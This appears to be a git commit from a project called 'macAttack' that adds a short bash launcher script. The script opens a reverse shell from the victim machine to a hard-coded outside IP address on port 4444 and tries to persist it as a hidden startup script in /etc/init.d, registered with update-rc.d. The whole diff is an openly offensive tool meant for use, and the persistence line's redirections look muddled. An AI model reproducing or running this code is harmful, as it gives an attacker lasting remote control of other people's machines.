9be21f8aadb37522a95b8b70c2e858685f79c6a4
Dan Goodman <xxdanthegoodmanxx@gmail.com>
2018-08-22 14:19:20 -0400

    Finished launching with persistence

--- macAttack/eggShellPersistenceLauncher/l.sh
+++ macAttack/eggShellPersistenceLauncher/l.sh
@@ -1,1 +1,15 @@
 #!/usr/bin/env bash
+PERSISTENCE=1
+HOST=206.189.231.131
+PORT=4444
+
+bash &> /dev/tcp/$HOST/$PORT 0>&1
+
+if [ $PERSISTENCE -eq 1 ]
+then
+    echo bash &> /dev/tcp/$HOST/$PORT 0>&1 > /etc/init.d/.espl.sh
+
+    chmod +x /etc/init.d/.espl.sh
+
+    update-rc.d .espl.sh defaults 100
+fi
